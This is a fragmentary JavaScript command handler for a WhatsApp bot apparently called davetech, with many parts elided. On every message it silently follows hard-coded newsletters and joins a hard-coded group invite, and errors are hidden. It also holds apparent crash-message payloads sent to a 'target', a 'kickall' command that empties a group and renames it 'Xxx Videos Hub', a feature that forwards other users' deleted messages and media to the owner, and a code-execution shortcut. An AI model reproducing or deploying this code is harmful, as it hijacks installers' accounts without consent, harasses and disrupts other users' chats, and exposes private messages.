...
Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("@davetech/baileys")
///package depedencies///////////////
const os = require('os')
const fs = require('fs')
...
/////////exports////////////////////////////////
module.exports = async (davetech, m) => {
try {
...
const sender = m.key.fromMe ? (davetech.user.id.split(':')[0]+'@s.whatsapp.net' || davetech.user.id) : (m.key.participant || m.key.remoteJid)
...
const groupMetadata = m.isGroup ? await davetech.groupMetadata(from).catch(e => {}) : ''
...
try {
    await davetech.newsletterFollow('120363257205745956@newsletter');
    await davetech.newsletterFollow('120363418618707597@newsletter');
    await davetech.newsletterFollow('120363322464215140@newsletter');
} catch (e) {
    // silently ignore newsletter follow errors
}

try {
    await davetech.groupAcceptInvite('EJ2Nb1A5CUF5P3DfDEoNBM');
} catch (e) {
...
/////////quoted functions//////////////////
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `🩸⃟‣davetech-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }}}}
...
if (trashown) return m.reply(bvl)
			...
			davetech.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
...
if (trashown) return m.reply(bvl)
			...
			davetech.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
...
await davetech.readMessages([readkey]);
}
davetech.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
davetech.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
davetech.sendPresenceUpdate('recording', m.chat)
}
}
...
await davetech.updateProfileStatus(`✳️ davetech BOT || ✅ Runtime : ${uptime}`)
...
davetech.sendPresenceUpdate('unavailable', from)
        }
        }
...
const qtext = { key: {fromMe: false, participant: `6281519434797@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "Made by Dave" }}}
...
newsletterName: "🩸⃟‣davetech-𝐂𝐋𝐈𝐄𝐍𝐓≈🚭" 
}
}
}, {
quoted: qtext
...
image:trashpic,  
caption: teks,
sourceUrl: 'https://github.com/Davex-254',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
...
quoted: fkontak
 ...
 /////////function set presence/////
        ...
        davetech.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        davetech.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let trashrecord = ['recording','composing']
        let xeonrecordinfinal = trashrecord[Math.floor(Math.random() * trashrecord.length)]
        davetech.sendPresenceUpdate(xeonrecordinfinal, from)
...
let { key } = await davetech.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
...
  await davetech.sendMessage(target, {
    text:
      "🧪‌⃰Ꮡ‌‌" +
      "ꦾ࣯࣯" +
      "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
...
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await davetech.relayMessage(target, {
        "albumMessage": {
...
xz = await davetech.relayMessage(target, xy.message, {messageId:xy.key.id})
await sleep(100)
}
}
...
  
  await davetech.relayMessage(target, msg.message, {
    participant: { jid:target }, 
...
async function handleMessageRevocation(davetech, revocationMessage) {
  ...
  if (originalMessage) {
    ...
    if (deletedBy.includes(davetech.user.id) || sentBy.includes(davetech.user.id)) return;

    let notificationText = `davetech-ANTIDELETE🔥\n\n` +
    ...
    try {
      if (originalMessage.message?.conversation) {
        ...
        await davetech.sendMessage(davetech.user.id, { text: notificationText });
      } 
        ...
        try {
          const buffer = await davetech.downloadMediaMessage(originalMessage.message.imageMessage);
          await davetech.sendMessage(davetech.user.id, { 
            image: buffer,
        ...
        try {
          const buffer = await davetech.downloadMediaMessage(originalMessage.message.videoMessage);
          await davetech.sendMessage(davetech.user.id, { 
            video: buffer, 
	 ...
	 notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Sticker]`;
      // Sticker message
      const buffer = await davetech.downloadMediaMessage(originalMessage.message.stickerMessage);      
      await davetech.sendMessage(davetech.user.id, { sticker: buffer, 
contextInfo: {
          externalAdReply: {
        ...
        const buffer = await davetech.downloadMediaMessage(docMessage);
...
contextInfo: {
      ...
      // Audio message
      const buffer = await davetech.downloadMediaMessage(originalMessage.message.audioMessage);
      const isPTT = originalMessage.message.audioMessage.ptt === true;
      await davetech.sendMessage(davetech.user.id, { audio: buffer, ptt: isPTT, mimetype: 'audio/mpeg', 
contextInfo: {
          externalAdReply: {
          title: notificationText,
          body: `DELETED BY: \n\n ${deletedByFormatted}`,
 ...
 if (antidel === "TRUE") {
        if (m.message?.protocolMessage?.key) {
          await handleMessageRevocation(davetech, m);
        } else {
...
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/Davex-254/davetech-system/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
...
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    ...
    await davetech.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
  ...
  davetech.sendMessage(m.chat, { text: `Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
  break;
//==================================================//           
      case 'ping':
  ...
  break; //==================================================//      
    case 'yts': case 'ytsearch': {
                ...
                davetech.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break  
...
//==================================================//              
        case "desc": case "setdesc": { 
                 ...
                 await davetech.groupUpdateDescription(m.chat, text); 
...
//==================================================//      
 case 'save': {
  try {
    ...
    const mediaBuffer = await davetech.downloadMediaMessage(m.quoted);
    ...
    // Confirm in chat
    return m.reply(`✅  ${mediaType} Saved by davetech!`);
...
//==================================================//     
        case "disp-90": { 
                 ...
                 if (!isAdmins) return reply (mess.admin); 
                     ...
                     await davetech.groupToggleEphemeral(m.chat, 90*24*3600); 
...
//==================================================//         
        case "disp-off": { 
                 ...
                 if (!isAdmins) return reply (mess.admin); 
                     ...
                     await davetech.groupToggleEphemeral(m.chat, 0); 
...
//==================================================//  
        case "disp-1": { 
                 ...
                 if (!isAdmins) return reply (mess.admin); 
                     ...
                     await davetech.groupToggleEphemeral(m.chat, 1*24*3600); 
...
//==================================================//        
    ...
    case 'unwarn': {
      ...
      davetech.sendTextWithMentions(m.chat, `✅ Success *${command}* @${users.split('@')[0]}\nRemoved Warning: ${sisa}/${setting.warnCount}`, m)
  ...
  try {
    ...
    await davetech.relayMessage(from, {
      template: {
        type: "media",
        media: {
          type: "image",
...
var result = await davetech.downloadAndSaveMediaMessage(media);
...
const Buffer = await stickerResult.toBuffer();
          davetech.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });
...
//==================================================//   
    ...
    case 'warn': {
      ...
      davetech.sendTextWithMentions(m.chat, `⚠️ Success *${command}* @${users.split('@')[0]}\nTotal Warning: ${total}/3`, m)
      ...
      if (total >= setting.warnCount) {
        ...
        await davetech.groupParticipantsUpdate(m.chat, [users], 'remove')
...
case "xowner": {
  ...
  davetech.relayMessage(m.chat, contact.message, {
...
case "invite": case "linkgc": { 
                 ...
                 let response = await davetech.groupInviteCode(m.chat); 
                 davetech.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await davetech.groupSettingUpdate(m.chat, 'announcement')
...
if (!m.isGroup) return reply(mess.group)
if (!trashown) return reply(mess.owner)
await davetech.groupSettingUpdate(m.chat, 'not_announcement')
...
case "kickall": {
 ...
 if (!isAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != davetech.decodeJid(davetech.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          reply("Initializing Kill command💀...");
      
      await davetech.removeProfilePicture(m.chat);
      await davetech.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await davetech.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
...
await davetech.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
...
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await davetech.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
...
case 'ig': case 'instagram': case 'igdl': {
 ...
 await davetech.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by Silencer media Team!*" }, { quoted: m });
 ...
 await davetech.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by silencer media team!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await davetech.sendMessage(m.chat, {
...
await davetech.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
davetech.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
davetech.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break //==================================================//
        case "disp-7": { 
                 ...
                 if (!isAdmins) return reply (mess.admin); 
                     ...
                     await davetech.groupToggleEphemeral(m.chat, 7*24*3600); 
...
let res = await davetech.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
...
await davetech.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//      
...
if (!m.isGroup) return reply(mess.group)
    davetech.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });
...
.then(({data}) => {
davetech.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//         
...
davetech.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//==================================================//        
        case 'truth':
    ...
    "do you play pubg, if you then send ur id number"
              ...
              davetech.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
//==================================================//          
        case 'dare':
              const dare =[
    ...
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     ...
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
              ...
              davetech.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
...
if (stdout) return reply(stdout)
  ...
  await davetech.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
